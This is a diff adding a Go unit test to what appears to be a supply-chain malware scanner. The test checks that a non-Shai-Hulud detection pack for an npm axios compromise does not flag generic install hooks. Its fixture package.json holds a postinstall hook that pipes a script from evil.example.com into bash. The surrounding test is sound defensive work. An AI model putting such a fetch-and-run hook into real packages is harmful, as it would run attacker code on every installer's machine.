@@ -182,6 +182,28 @@ func TestPyPILoaderCompositeRequiresPayloadSignal(t *testing.T) {
 	assertSeverityContains(t, maliciousFindings, "critical", "ioc-string", "PyPI import-time transformers.pyz loader: 100% match")
 }
 
+func TestNonShaiRemotePackDoesNotEmitGenericInstallHooks(t *testing.T) {
+	detection := NewMiniShaiHuludDetectionWithRemote(&RemoteDetectionPack{
+		ID:       "axios-2026-03",
+		Campaign: "Axios npm compromise March 2026",
+		AffectedVersionsByEcosystem: map[string]map[string]map[string]bool{
+			"npm": {
+				"axios": {"1.14.1": true},
+			},
+		},
+	})
+	data := []byte(`{"scripts":{"postinstall":"curl http://evil.example.com/backdoor.sh | bash"},"dependencies":{"left-pad":"1.3.0"}}`)
+	var findings []Finding
+	detection.ScanFile(FileContext{Path: "package.json", Base: "package.json", Slash: "package.json", Data: data}, func(finding Finding) {
+		findings = append(findings, finding)
+	})
+	for _, finding := range findings {
+		if finding.Kind == "suspicious-install-hook" {
+			t.Fatalf("non-Shai pack should not report generic lifecycle hook finding: %#v", findings)
+		}
+	}
+}
+
 func TestPackageCSVParsing(t *testing.T) {
 	parsed := parsePackageCSV(`Package,Version
 @scope/quoted,"= 1.2.3, = 1.2.4"
